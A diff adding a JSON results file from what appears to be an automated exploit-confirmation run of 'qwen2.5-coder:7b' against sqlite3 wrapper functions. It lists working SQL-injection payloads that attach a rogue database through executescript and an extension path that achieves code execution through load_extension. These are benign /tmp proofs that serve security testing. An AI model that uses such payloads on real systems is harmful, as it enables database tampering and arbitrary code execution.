@@ -1,0 +1,372 @@
+{
+  "model": "qwen2.5-coder:7b",
+  "results": [
+    {
+      "func": "_executescript",
+      "cwe": "CWE-89",
+      "param": "sql",
+      "confirmed": true,
+      "samples_attempted": 6,
+      "samples_proved": 6,
+      "sample_results": [
+        {
+          "slot": "temp_0_0",
+          "confirmed": true,
+          "payload": "; ATTACH DATABASE '/tmp/tier2_proof_sz52tnr6/pwn_c92a6c74d4ce.db' AS pwn; CREATE TABLE pwn.pwned(x); --",
+          "proof": "injected SQL ATTACHed /tmp/tier2_proof_sz52tnr6/pwn_c92a6c74d4ce.db and CREATEd table 'pwned'",
+          "via": "bank"
+        },
+        {
+          "slot": "temp_0_7[0]",
+          "confirmed": true,
+          "payload": "; ATTACH DATABASE '/tmp/tier2_proof_l1rdscb0/pwn_3d1b5b389304.db' AS pwn; CREATE TABLE pwn.pwned(x); --",
+          "proof": "injected SQL ATTACHed /tmp/tier2_proof_l1rdscb0/pwn_3d1b5b389304.db and CREATEd table 'pwned'",
+          "via": "bank"
+        },
+        {
+          "slot": "temp_0_7[1]",
+          "confirmed": true,
+          "payload": "; ATTACH DATABASE '/tmp/tier2_proof_g63pfk7o/pwn_aa5e6687c280.db' AS pwn; CREATE TABLE pwn.pwned(x); --",
+          "proof": "injected SQL ATTACHed /tmp/tier2_proof_g63pfk7o/pwn_aa5e6687c280.db and CREATEd table 'pwned'",
+          "via": "bank"
+        },
+        {
+          "slot": "temp_0_7[2]",
+          "confirmed": true,
+          "payload": "; ATTACH DATABASE '/tmp/tier2_proof_ec9gvn6_/pwn_330c71a2aa07.db' AS pwn; CREATE TABLE pwn.pwned(x); --",
+          "proof": "injected SQL ATTACHed /tmp/tier2_proof_ec9gvn6_/pwn_330c71a2aa07.db and CREATEd table 'pwned'",
+          "via": "bank"
+        },
+        {
+          "slot": "temp_0_7[3]",
+          "confirmed": true,
+          "payload": "; ATTACH DATABASE '/tmp/tier2_proof_mbrvtmax/pwn_a17f3e237762.db' AS pwn; CREATE TABLE pwn.pwned(x); --",
+          "proof": "injected SQL ATTACHed /tmp/tier2_proof_mbrvtmax/pwn_a17f3e237762.db and CREATEd table 'pwned'",
+          "via": "bank"
+        },
+        {
+          "slot": "temp_0_7[4]",
+          "confirmed": true,
+          "payload": "; ATTACH DATABASE '/tmp/tier2_proof_iervbxa5/pwn_91d933c90ad3.db' AS pwn; CREATE TABLE pwn.pwned(x); --",
+          "proof": "injected SQL ATTACHed /tmp/tier2_proof_iervbxa5/pwn_91d933c90ad3.db and CREATEd table 'pwned'",
+          "via": "bank"
+        }
+      ],
+      "slot": "temp_0_0",
+      "payload": "; ATTACH DATABASE '/tmp/tier2_proof_sz52tnr6/pwn_c92a6c74d4ce.db' AS pwn; CREATE TABLE pwn.pwned(x); --",
+      "proof": "injected SQL ATTACHed /tmp/tier2_proof_sz52tnr6/pwn_c92a6c74d4ce.db and CREATEd table 'pwned'",
+      "via": "bank",
+      "sink": "sqlite3.Connection.executescript"
+    },
+    {
+      "func": "analyze",
+      "cwe": "CWE-89",
+      "param": "name",
+      "confirmed": false,
+      "samples_attempted": 6,
+      "samples_proved": 0,
+      "sample_results": [
+        {
+          "slot": "temp_0_0",
+          "confirmed": false,
+          "payload": null,
+          "proof": null,
+          "via": null
+        },
+        {
+          "slot": "temp_0_7[0]",
+          "confirmed": false,
+          "payload": null,
+          "proof": null,
+          "via": null
+        },
+        {
+          "slot": "temp_0_7[1]",
+          "confirmed": false,
+          "payload": null,
+          "proof": null,
+          "via": null
+        },
+        {
+          "slot": "temp_0_7[2]",
+          "confirmed": false,
+          "payload": null,
+          "proof": null,
+          "via": null
+        },
+        {
+          "slot": "temp_0_7[3]",
+          "confirmed": false,
+          "payload": null,
+          "proof": null,
+          "via": null
+        },
+        {
+          "slot": "temp_0_7[4]",
+          "confirmed": false,
+          "payload": null,
+          "proof": null,
+          "via": null
+        }
+      ]
+    },
+    {
+      "func": "attach",
+      "cwe": "CWE-89",
+      "param": "alias",
+      "confirmed": false,
+      "samples_attempted": 6,
+      "samples_proved": 0,
+      "sample_results": [
+        {
+          "slot": "temp_0_0",
+          "confirmed": false,
+          "payload": null,
+          "proof": null,
+          "via": null
+        },
+        {
+          "slot": "temp_0_7[0]",
+          "confirmed": false,
+          "payload": null,
+          "proof": null,
+          "via": null
+        },
+        {
+          "slot": "temp_0_7[1]",
+          "confirmed": false,
+          "payload": null,
+          "proof": null,
+          "via": null
+        },
+        {
+          "slot": "temp_0_7[2]",
+          "confirmed": false,
+          "payload": null,
+          "proof": null,
+          "via": null
+        },
+        {
+          "slot": "temp_0_7[3]",
+          "confirmed": false,
+          "payload": null,
+          "proof": null,
+          "via": null
+        },
+        {
+          "slot": "temp_0_7[4]",
+          "confirmed": false,
+          "payload": null,
+          "proof": null,
+          "via": null
+        }
+      ]
+    },
+    {
+      "func": "create_view",
+      "cwe": "CWE-89",
+      "param": "name",
+      "confirmed": false,
+      "samples_attempted": 4,
+      "samples_proved": 0,
+      "sample_results": [
+        {
+          "slot": "temp_0_0",
+          "confirmed": false,
+          "payload": null,
+          "proof": null,
+          "via": null
+        },
+        {
+          "slot": "temp_0_7[1]",
+          "confirmed": false,
+          "payload": null,
+          "proof": null,
+          "via": null
+        },
+        {
+          "slot": "temp_0_7[2]",
+          "confirmed": false,
+          "payload": null,
+          "proof": null,
+          "via": null
+        },
+        {
+          "slot": "temp_0_7[4]",
+          "confirmed": false,
+          "payload": null,
+          "proof": null,
+          "via": null
+        }
+      ]
+    },
+    {
+      "func": "execute",
+      "cwe": "CWE-89",
+      "param": "sql",
+      "confirmed": false,
+      "samples_attempted": 6,
+      "samples_proved": 0,
+      "sample_results": [
+        {
+          "slot": "temp_0_0",
+          "confirmed": false,
+          "payload": null,
+          "proof": null,
+          "via": null
+        },
+        {
+          "slot": "temp_0_7[0]",
+          "confirmed": false,
+          "payload": null,
+          "proof": null,
+          "via": null
+        },
+        {
+          "slot": "temp_0_7[1]",
+          "confirmed": false,
+          "payload": null,
+          "proof": null,
+          "via": null
+        },
+        {
+          "slot": "temp_0_7[2]",
+          "confirmed": false,
+          "payload": null,
+          "proof": null,
+          "via": null
+        },
+        {
+          "slot": "temp_0_7[3]",
+          "confirmed": false,
+          "payload": null,
+          "proof": null,
+          "via": null
+        },
+        {
+          "slot": "temp_0_7[4]",
+          "confirmed": false,
+          "payload": null,
+          "proof": null,
+          "via": null
+        }
+      ]
+    },
+    {
+      "func": "init_spatialite",
+      "cwe": "CWE-94",
+      "param": "path",
+      "confirmed": true,
+      "samples_attempted": 5,
+      "samples_proved": 5,
+      "sample_results": [
+        {
+          "slot": "temp_0_0",
+          "confirmed": true,
+          "payload": "/tmp/vulcan_tier2_ext/proofext.so",
+          "proof": "attacker-controlled code execution created /tmp/tier2_proof_8bo8rhnh/pwned_9dfd1dac7217",
+          "via": "bank"
+        },
+        {
+          "slot": "temp_0_7[1]",
+          "confirmed": true,
+          "payload": "/tmp/vulcan_tier2_ext/proofext.so",
+          "proof": "attacker-controlled code execution created /tmp/tier2_proof_m8ml9bje/pwned_2ffab8646da2",
+          "via": "bank"
+        },
+        {
+          "slot": "temp_0_7[2]",
+          "confirmed": true,
+          "payload": "/tmp/vulcan_tier2_ext/proofext.so",
+          "proof": "attacker-controlled code execution created /tmp/tier2_proof_kf3rahx3/pwned_df45127e1ac6",
+          "via": "bank"
+        },
+        {
+          "slot": "temp_0_7[3]",
+          "confirmed": true,
+          "payload": "/tmp/vulcan_tier2_ext/proofext.so",
+          "proof": "attacker-controlled code execution created /tmp/tier2_proof_vv32m36u/pwned_d1375f801c51",
+          "via": "bank"
+        },
+        {
+          "slot": "temp_0_7[4]",
+          "confirmed": true,
+          "payload": "/tmp/vulcan_tier2_ext/proofext.so",
+          "proof": "attacker-controlled code execution created /tmp/tier2_proof_oj9lll32/pwned_ea7390a1103e",
+          "via": "bank"
+        }
+      ],
+      "slot": "temp_0_0",
+      "payload": "/tmp/vulcan_tier2_ext/proofext.so",
+      "proof": "attacker-controlled code execution created /tmp/tier2_proof_8bo8rhnh/pwned_9dfd1dac7217",
+      "via": "bank",
+      "sink": "sqlite3.Connection.load_extension"
+    },
+    {
+      "func": "rename_table",
+      "cwe": "CWE-89",
+      "param": "name",
+      "confirmed": false,
+      "samples_attempted": 6,
+      "samples_proved": 0,
+      "sample_results": [
+        {
+          "slot": "temp_0_0",
+          "confirmed": false,
+          "payload": null,
+          "proof": null,
+          "via": null
+        },
+        {
+          "slot": "temp_0_7[0]",
+          "confirmed": false,
+          "payload": null,
+          "proof": null,
+          "via": null
+        },
+        {
+          "slot": "temp_0_7[1]",
+          "confirmed": false,
+          "payload": null,
+          "proof": null,
+          "via": null
+        },
+        {
+          "slot": "temp_0_7[2]",
+          "confirmed": false,
+          "payload": null,
+          "proof": null,
+          "via": null
+        },
+        {
+          "slot": "temp_0_7[3]",
+          "confirmed": false,
+          "payload": null,
+          "proof": null,
+          "via": null
+        },
+        {
+          "slot": "temp_0_7[4]",
+          "confirmed": false,
+          "payload": null,
+          "proof": null,
+          "via": null
+        }
+      ]
+    }
+  ],
+  "by_cwe": {
+    "CWE-89": {
+      "fn_attempted": 6,
+      "fn_confirmed": 1,
+      "samples_attempted": 34,
+      "samples_proved": 6
+    },
+    "CWE-94": {
+      "fn_attempted": 1,
+      "fn_confirmed": 1,
+      "samples_attempted": 5,
+      "samples_proved": 5
+    }
+  }
+}
